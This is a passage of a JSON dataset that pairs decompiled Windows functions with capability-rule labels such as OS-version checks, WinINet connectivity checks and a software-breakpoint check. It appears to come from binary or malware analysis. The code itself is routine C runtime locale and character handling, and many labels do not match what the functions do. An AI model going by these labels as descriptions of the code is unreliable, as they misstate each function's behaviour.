        "decompiled_code": "\nuint fcn.00413d55(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *arg_8h;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *arg_14h;\n    uint *puVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*0x451350 == 0) && (*0x45134c == 0)) {\n        if (((*0x452670 != NULL) && (**0x452670 == 0)) && (*0x452670 != *(*0x44e394 + 0x2c))) {\n            fcn.00409f48(*0x452670);\n            fcn.00409f48(*0x451450);\n        }\n        *0x452674 = NULL;\n        *0x452670 = NULL;\n        arg_14h = 0x44e0ac;\n        *0x451450 = NULL;\n        puVar8 = *0x451450;\n        arg_8h = *0x452670;\ncode_r0x00413f02:\n        *0x452670 = arg_8h;\n        *0x451450 = puVar8;\n        *0x44e874 = **arg_14h;\n        *0x44e878 = 1;\n        uVar6 = 0;\n        *0x44e0dc = arg_14h;\n    }\n    else {\n        arg_14h = fcn.0040c9f1(1, 0x30);\n        if (arg_14h != NULL) {\n            puVar8 = *0x44e0dc;\n            puVar11 = arg_14h;\n            for (iVar7 = 0xc; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar11 = *puVar8;\n                puVar8 = puVar8 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            arg_8h = fcn.00409f36(4);\n            if (arg_8h != NULL) {\n                *arg_8h = 0;\n                if (*0x451350 == 0) {\n                    *0x452674 = NULL;\n                    *arg_14h = *0x44e0ac;\n                    arg_14h[1] = *0x44e0b0;\n                    arg_14h[2] = *0x44e0b4;\n                }\n                else {\n                    *0x452674 = fcn.00409f36(4);\n                    if (*0x452674 == NULL) {\n                        uVar6 = 1;\ncode_r0x00413e60:\n                        fcn.00409f48(arg_14h);\n                        fcn.00409f48(arg_8h);\n                        return uVar6;\n                    }\n                    **0x452674 = 0;\n                    uVar9 = *0x451492;\n                    uVar3 = fcn.0041643e(1, uVar9, 0xe, arg_14h);\n                    uVar4 = fcn.0041643e(1, uVar9, 0xf, arg_14h + 1);\n                    uVar9 = fcn.0041643e(1, uVar9, 0x10, arg_14h + 2);\n                    if ((uVar9 | uVar3 | uVar4) != 0) {\n                        fcn.00413cf6(arg_14h);\n                        uVar6 = 0xffffffff;\n                        goto code_r0x00413e60;\n                    }\n                    pcVar5 = arg_14h[2];\n                    while (*pcVar5 != '\\0') {\n                        cVar2 = *pcVar5;\n                        if ((cVar2 < '0') || ('9' < cVar2)) {\n                            pcVar10 = pcVar5;\n                            if (cVar2 != ';') goto code_r0x00413e8c;\n                            do {\n                                pcVar1 = pcVar10 + 1;\n                                *pcVar10 = *pcVar1;\n                                pcVar10 = pcVar1;\n                            } while (*pcVar1 != '\\0');\n                        }\n                        else {\n                            *pcVar5 = cVar2 + -0x30;\ncode_r0x00413e8c:\n                            pcVar5 = pcVar5 + 1;\n                        }\n                    }\n                }\n                puVar8 = arg_14h;\n                if (((*0x452670 != NULL) && (**0x452670 == 0)) && (*0x452670 != *(*0x44e394 + 0x2c))) {\n                    fcn.00409f48(*0x452670);\n                    fcn.00409f48(*0x451450);\n                }\n                goto code_r0x00413f02;\n            }\n            fcn.00409f48(arg_14h);\n        }\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 1149
    },
    "00413ffb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00413ffb(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    char *pcVar17;\n    uint uVar18;\n    int32_t iVar19;\n    uint32_t uVar20;\n    char *pcVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint var_4h;\n    \n    if ((*0x45134c == 0) && (*0x451350 == 0)) {\n        *0x45266c = NULL;\n        *0x452670 = NULL;\n        *0x44e0dc = 0x44e0ac;\n        *0x451450 = NULL;\ncode_r0x00414233:\n        uVar18 = 0;\n    }\n    else {\n        arg_8h = fcn.0040c9f1(1, 0x30);\n        if (arg_8h != NULL) {\n            arg_8h_00 = fcn.00409f36(4);\n            if (arg_8h_00 == NULL) {\n                fcn.00409f48(arg_8h);\n            }\n            else {\n                *arg_8h_00 = 0;\n                if (*0x45134c == 0) {\n                    puVar22 = 0x44e0ac;\n                    puVar23 = arg_8h;\n                    for (iVar19 = 0xc; iVar19 != 0; iVar19 = iVar19 + -1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + 1;\n                        puVar23 = puVar23 + 1;\n                    }\n                    *0x45266c = NULL;\ncode_r0x00414200:\n                    *arg_8h = **0x44e0dc;\n                    arg_8h[1] = (*0x44e0dc)[1];\n                    arg_8h[2] = (*0x44e0dc)[2];\n                    *0x44e0dc = arg_8h;\n                    *0x451450 = arg_8h;\n                    *0x452670 = arg_8h_00;\n                    goto code_r0x00414233;\n                }\n                *0x45266c = fcn.00409f36(4);\n                if (*0x45266c == NULL) {\n                    fcn.00409f48(arg_8h);\n                    fcn.00409f48(arg_8h_00);\n                }\n                else {\n                    **0x45266c = 0;\n                    uVar20 = *0x45148c;\n                    uVar3 = fcn.0041643e(1, uVar20, 0x15, arg_8h + 3);\n                    uVar4 = fcn.0041643e(1, uVar20, 0x14, arg_8h + 4);\n                    uVar5 = fcn.0041643e(1, uVar20, 0x16, arg_8h + 5);\n                    uVar6 = fcn.0041643e(1, uVar20, 0x17, arg_8h + 6);\n                    uVar7 = fcn.0041643e(1, uVar20, 0x18, arg_8h + 7);\n                    uVar8 = fcn.0041643e(1, uVar20, 0x50, arg_8h + 8);\n                    uVar9 = fcn.0041643e(1, uVar20, 0x51, arg_8h + 9);\n                    uVar10 = fcn.0041643e(0, uVar20, 0x1a, arg_8h + 10);\n                    uVar11 = fcn.0041643e(0, uVar20, 0x19, arg_8h + 0x29);\n                    uVar12 = fcn.0041643e(0, uVar20, 0x54, arg_8h + 0x2a);\n                    uVar13 = fcn.0041643e(0, uVar20, 0x55, arg_8h + 0x2b);\n                    uVar14 = fcn.0041643e(0, uVar20, 0x56, arg_8h + 0xb);\n                    uVar15 = fcn.0041643e(0, uVar20, 0x57, arg_8h + 0x2d);\n                    uVar16 = fcn.0041643e(0, uVar20, 0x52, arg_8h + 0x2e);\n                    uVar20 = fcn.0041643e(0, uVar20, 0x53, arg_8h + 0x2f);\n                    if ((uVar20 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 |\n                                  uVar13 | uVar14 | uVar15 | uVar16) == 0) {\n                        pcVar17 = arg_8h[7];\n                        while (*pcVar17 != '\\0') {\n                            cVar2 = *pcVar17;\n                            if ((cVar2 < '0') || ('9' < cVar2)) {\n                                pcVar21 = pcVar17;\n                                if (cVar2 != ';') goto code_r0x004141ce;\n                                do {\n                                    pcVar1 = pcVar21 + 1;\n                                    *pcVar21 = *pcVar1;\n                                    pcVar21 = pcVar1;\n                                } while (*pcVar1 != '\\0');\n                            }\n                            else {\n                                *pcVar17 = cVar2 + -0x30;\ncode_r0x004141ce:\n                                pcVar17 = pcVar17 + 1;\n                            }\n                        }\n                        goto code_r0x00414200;\n                    }\n                    fcn.00413f22(arg_8h);\n                    fcn.00409f48(arg_8h);\n                    fcn.00409f48(arg_8h_00);\n                }\n            }\n        }\n        uVar18 = 1;\n    }\n    return uVar18;\n}\n",
        "token_count": 1517
    },
    "0041423a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_12h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041423a(void)\n\n{\n    uint8_t *puVar1;\n    char16_t *noname_3;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    ushort *puVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uchar auStack24 [2];\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    var_1ch = 0;\n    if (*0x451348 == 0) {\n        *0x44e330 = \n        L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x81\\x81\\x81\\x81\\x81\\x81\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x10\\x10\\x10\\x10\\x10\\x10\\x82\\x82\\x82\\x82\\x82\\x82\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x10\\x10\\x10\\x10 \"\n        ;\n        *0x452668 = NULL;\n        *0x452664 = NULL;\n        goto code_r0x00414419;\n    }\n    if ((*0x451358 == 0) && (iVar3 = fcn.0041643e(0, *0x451484, 0x1004, 0x451358),  iVar3 != 0)) {\ncode_r0x004143ec:\n        fcn.00409f48(var_20h);\n        fcn.00409f48(var_24h);\n    }\n    else {\n        var_20h = fcn.00409f36(4);\n        var_24h = fcn.00409f36(0x300);\n        var_1ch = fcn.00409f36(0x101);\n        if ((var_20h == NULL) || ((var_24h == 0 || (var_1ch == 0)))) goto code_r0x004143ec;\n        *var_20h = 0;\n        iVar3 = 0;\n        do {\n            *(iVar3 + var_1ch) = iVar3;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x100);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(*0x451358, &var_18h);\n        if ((iVar3 == 0) || (5 < var_18h)) goto code_r0x004143ec;\n        *0x44e870 = var_18h & 0xffff;\n        if ((1 < *0x44e870) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                uVar2 = *puVar4;\n                if (uVar2 == 0) break;\n                for (uVar5 = puVar4[-1]; uVar5 <= uVar2; uVar5 = uVar5 + 1) {\n                    *(uVar5 + var_1ch) = 0;\n                    uVar2 = *puVar4;\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 != 0);\n        }\n        noname_3 = var_24h + 0x100;\n        iVar3 = fcn.0041146b(1, var_1ch, 0x100, noname_3, 0, 0, 0, unaff_ESI, unaff_EBX, unaff_EDI, noname_3, var_20h, \n                             var_1ch, var_18h, _auStack24);\n        if (iVar3 == 0) goto code_r0x004143ec;\n        *(var_24h + 0xfe) = 0;\n        if ((1 < *0x44e870) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                if (*puVar4 == 0) break;\n                uVar5 = puVar4[-1];\n                if (uVar5 <= *puVar4) {\n                    puVar6 = var_24h + 0x100 + uVar5 * 2;\n                    do {\n                        *puVar6 = 0x8000;\n                        uVar5 = uVar5 + 1;\n                        puVar6 = puVar6 + 1;\n                    } while (uVar5 <= *puVar4);\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 != 0);\n        }\n        fcn.0040b7b0(var_24h, var_24h + 0x200, 0xfe);\n        *0x44e330 = noname_3;\n        *0x452664 = var_24h + 0xfe;\n        *0x452668 = var_20h;\n    }\n    fcn.00409f48(var_1ch);\ncode_r0x00414419:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 1405
    },
    "004145fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004145fe(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    if ((param_1 == NULL) || (*param_1 == '\\0')) {\ncode_r0x00414644:\n        uVar2 = 0x1004;\ncode_r0x0041464f:\n        iVar1 = (**0x451474)(*0x45145c, uVar2, &var_ch, 8);\n        if (iVar1 == 0) goto code_r0x00414669;\n        param_1 = &var_ch;\n    }\n    else {\n        iVar1 = fcn.0040ef40(param_1, 0x4451f0);\n        if (iVar1 == 0) goto code_r0x00414644;\n        iVar1 = fcn.0040ef40(param_1, 0x4451ec);\n        if (iVar1 == 0) {\n            uVar2 = 0xb;\n            goto code_r0x0041464f;\n        }\n    }\n    fcn.0040b2c4(param_1);\ncode_r0x00414669:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 297
    },
    "00414692": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414692(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    iVar5 = 0;\n    iVar6 = 0x1a;\n    do {\n        iVar2 = (iVar6 + iVar5) / 2;\n        uVar1 = *(iVar2 * 0x2c + 0x4443f0);\n        if (arg_8h == uVar1) {\n            if (arg_ch == 1) {\n                pcVar4 = \"040a\" + iVar2 * 0x2c;\n            }\n            else if (arg_ch == 3) {\n                pcVar4 = iVar2 * 0x2c + 0x444400;\n            }\n            else if (arg_ch == 7) {\n                pcVar4 = iVar2 * 0x2c + 0x444408;\n            }\n            else if (arg_ch == 0xb) {\n                pcVar4 = iVar2 * 0x2c + 0x44440c;\n            }\n            else if (arg_ch == 0x1001) {\n                pcVar4 = *(iVar2 * 0x2c + 0x4443fc);\n            }\n            else if (arg_ch == 0x1002) {\n                pcVar4 = *(iVar2 * 0x2c + 0x444404);\n            }\n            else {\n                if (arg_ch != 0x1004) break;\n                pcVar4 = iVar2 * 0x2c + 0x444414;\n            }\n            if ((pcVar4 != NULL) && (0 < arg_14h)) {\n                fcn.00414460(arg_10h, pcVar4, arg_14h + -1);\n                *(arg_10h + -1 + arg_14h) = 0;\n                return 1;\n            }\n            break;\n        }\n        if (arg_8h < uVar1) {\n            iVar6 = iVar2 + -1;\n        }\n        else {\n            iVar5 = iVar2 + 1;\n        }\n    } while (iVar5 <= iVar6);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 568
    },
    "0041485b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041485b(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    iVar1 = (**0x451474)(arg_8h & 0x3ff | 0x400, 1, &var_7ch, 0x78);\n    if (((iVar1 != 0) && (uVar2 = fcn.00414775(),  arg_8h != uVar2)) && (arg_ch != 0)) {\n        fcn.0040baf0(*0x451470);\n        fcn.004147aa();\n    }\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 191
    },
    "00414ae6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414ae6(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    arg_8h_00 = fcn.00414775();\n    iVar1 = (**0x451474)(arg_8h_00, (-(*0x451460 != 0) & 0xfffff002) + 0x1001, &var_7ch, 0x78);\n    if (iVar1 == 0) {\n        *0x451454 = 0;\n        goto code_r0x00414ba4;\n    }\n    iVar1 = fcn.00416565(*0x451470, &var_7ch);\n    if (iVar1 == 0) {\n        if (*0x451460 == 0) {\n            iVar1 = 1;\n            goto code_r0x00414b78;\n        }\n    }\n    else {\n        if (((*0x451460 != 0) || (*0x45146c == 0)) ||\n           (iVar1 = fcn.004165ce(*0x451470, &var_7ch, *0x45146c),  iVar1 != 0)) goto code_r0x00414ba4;\ncode_r0x00414b78:\n        iVar1 = fcn.0041485b(arg_8h_00, iVar1);\n        if (iVar1 == 0) goto code_r0x00414ba4;\n    }\n    *0x451454 = *0x451454 | 4;\n    *0x451458 = arg_8h_00;\n    *0x45145c = arg_8h_00;\ncode_r0x00414ba4:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 423
    },
    "00414cc3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00414cc3(char *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    uint uVar2;\n    int16_t *unaff_EBX;\n    int32_t unaff_retaddr;\n    \n    if (*0x451474 == NULL) {\n        if (*0x45101c == 2) {\n            *0x451474 = _sym.imp.KERNEL32.dll_GetLocaleInfoA;\n        }\n        else {\n            *0x451474 = fcn.00414692;\n        }\n    }\n    if (param_1 == NULL) {\ncode_r0x00414d9d:\n        fcn.004145e4();\ncode_r0x00414da2:\n        if (*0x451454 == 0) {\n            return 0;\n        }\n    }\n    else {\n        *0x451468 = param_1 + 0x40;\n        *0x451470 = param_1;\n        if ((*0x451468 != NULL) && (**0x451468 != '\\0')) {\n            fcn.00414584(0x444a20, 0x16, 0x451468);\n        }\n        *0x451454 = 0;\n        if ((*0x451470 == NULL) || (**0x451470 == '\\0')) {\n            if ((*0x451468 == NULL) || (**0x451468 == '\\0')) goto code_r0x00414d9d;\n            fcn.00414bb1();\n            goto code_r0x00414da2;\n        }\n        if ((*0x451468 == NULL) || (**0x451468 == '\\0')) {\n            fcn.00414c6e();\n        }\n        else {\n            fcn.00414be8();\n        }\n        if (*0x451454 == 0) {\n            iVar1 = fcn.00414584(0x444bd0, 0x40, 0x451470);\n            if (iVar1 != 0) {\n                if ((*0x451468 == NULL) || (**0x451468 == '\\0')) {\n                    fcn.00414c6e();\n                }\n                else {\n                    fcn.00414be8();\n                }\n            }\n            goto code_r0x00414da2;\n        }\n    }\n    arg_8h = fcn.004145fe();\n    if (((arg_8h == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h & 0xffff),  iVar1 == 0)) ||\n       (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidLocale)(*0x451458, 1),  uVar2 = *0x451458,  iVar1 == 0)) {\ncode_r0x00414e72:\n        uVar2 = 0;\n    }\n    else {\n        if (unaff_EBX != NULL) {\n            *unaff_EBX = *0x451458;\n            unaff_EBX[1] = *0x45145c;\n            unaff_EBX[2] = arg_8h;\n        }\n        if (unaff_retaddr != 0) {\n            if (*unaff_EBX == 0x814) {\n                fcn.0040ee40(unaff_retaddr, \"Norwegian-Nynorsk\");\n            }\n            else {\n                iVar1 = (**0x451474)(uVar2, 0x1001, unaff_retaddr, 0x40);\n                if (iVar1 == 0) goto code_r0x00414e72;\n            }\n            iVar1 = (**0x451474)(*0x45145c, 0x1002, unaff_retaddr + 0x40, 0x40);\n            if (iVar1 == 0) goto code_r0x00414e72;\n            fcn.0041668b(arg_8h, unaff_retaddr + 0x80, 10);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 890
    },
    "00414eb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00414eb9(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_3;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint32_t var_4h;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    if ((*(arg_8h + 0x14) == 0) || ((*(arg_8h + 0x24) != 0 && (arg_ch < 0x80)))) {\n        if ((0x40 < arg_ch) && (arg_ch < 0x5b)) {\n            return arg_ch + 0x20;\n        }\n    }\n    else {\n        noname_3 = 1;\n        var_4h = in_ECX;\n        if (arg_ch < 0x100) {\n            if (*(arg_8h + 0x28) < 2) {\n                uVar3 = *(*(arg_8h + 0x48) + arg_ch * 2) & 1;\n            }\n            else {\n                uVar3 = fcn.0040f03c(arg_8h, arg_ch, 1);\n            }\n            if (uVar3 == 0) {\n                return uVar2;\n            }\n        }\n        if ((*(*(uVar1 + 0x48) + 1 + (uVar2 >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            arg_8h = arg_8h & 0xffff0000 | uVar2 & 0xff;\n        }\n        else {\n            arg_8h = arg_8h & 0xff000000 | CONCAT11(uVar2, uVar2 >> 8);\n            noname_3 = 2;\n        }\n        iVar4 = fcn.004110af(*(uVar1 + 0x14), 0x100, &arg_8h, noname_3, &var_4h, 3, *(uVar1 + 4), 1, unaff_EDI, \n                             unaff_ESI, unaff_EBX, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, \n                             in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                             in_stack_00000030, in_stack_00000034);\n        if (iVar4 != 0) {\n            if (iVar4 != 1) {\n                return CONCAT11(var_4h, var_4h._1_1_);\n            }\n            return var_4h & 0xff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 838
    },
    "00414fa3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00414fa3(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_2 / 0x20;\n    uVar1 = *(param_1 + iVar2 * 4) & ~(-1 << (0x1fU - param_2 % 0x20 & 0x1f));\n    while( true ) {\n        if (uVar1 != 0) {\n            return 0;\n        }\n        iVar2 = iVar2 + 1;\n        if (2 < iVar2) break;\n        uVar1 = *(param_1 + iVar2 * 4);\n    }\n    return 1;\n}\n",
        "token_count": 164
    },
    "004150c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004150c8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_ch % 0x20;\n    iVar2 = 0;\n    var_4h = 0;\n    do {\n        uVar1 = *(arg_8h + iVar2 * 4);\n        *(arg_8h + iVar2 * 4) = uVar1 >> (uVar3 & 0x1f) | var_4h;\n        var_4h = (uVar1 & ~(-1 << (uVar3 & 0x1f))) << (0x20 - uVar3 & 0x1f);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 3);\n    iVar2 = 2;\n    puVar4 = arg_8h + (2 - arg_ch / 0x20) * 4;\n    do {\n        if (iVar2 < arg_ch / 0x20) {\n            *(arg_8h + iVar2 * 4) = 0;\n        }\n        else {\n            *(arg_8h + iVar2 * 4) = *puVar4;\n        }\n        iVar2 = iVar2 + -1;\n        puVar4 = puVar4 + -1;\n    } while (-1 < iVar2);\n    return;\n}\n",
        "token_count": 352
    },
    "0041564f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041564f(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (*0x45149c == NULL) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"user32.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar2 == 0) || (*0x45149c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x445260),  *0x45149c == NULL))\n        {\n            return 0;\n        }\n        *0x4514a0 = (*pcVar1)(iVar2, 0x445250);\n        *0x4514a4 = (*pcVar1)(iVar2, 0x44523c);\n        if ((*0x45101c == 2) && (*0x4514ac = (*pcVar1)(iVar2, \"GetUserObjectInformationA\"),  *0x4514ac != NULL)) {\n            *0x4514a8 = (*pcVar1)(iVar2, \"GetProcessWindowStation\");\n        }\n    }\n    if ((*0x4514a8 == NULL) ||\n       (((iVar2 = (**0x4514a8)(),  iVar2 != 0 && (iVar2 = (**0x4514ac)(iVar2, 1, &var_10h, 0xc, &var_4h),  iVar2 != 0))\n        && ((var_8h & 1) != 0)))) {\n        if (((*0x4514a0 != NULL) && (iVar4 = (**0x4514a0)(),  iVar4 != 0)) && (*0x4514a4 != NULL)) {\n            iVar4 = (**0x4514a4)(iVar4);\n        }\n    }\n    else if (*0x451028 < 4) {\n        arg_10h = arg_10h | 0x40000;\n    }\n    else {\n        arg_10h = arg_10h | 0x200000;\n    }\n    uVar3 = (**0x45149c)(iVar4, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 563
    },
    "00415748": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00415748(uint8_t param_1, uint32_t param_2, uint8_t param_3)\n\n{\n    if ((*(param_1 + 0x4527e1) & param_3) == 0) {\n        if (param_2 == 0) {\n            param_2 = 0;\n        }\n        else {\n            param_2 = *(*0x44e330 + param_1 * 2) & param_2;\n        }\n        if (param_2 == 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 132
    },
    "00415cf3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
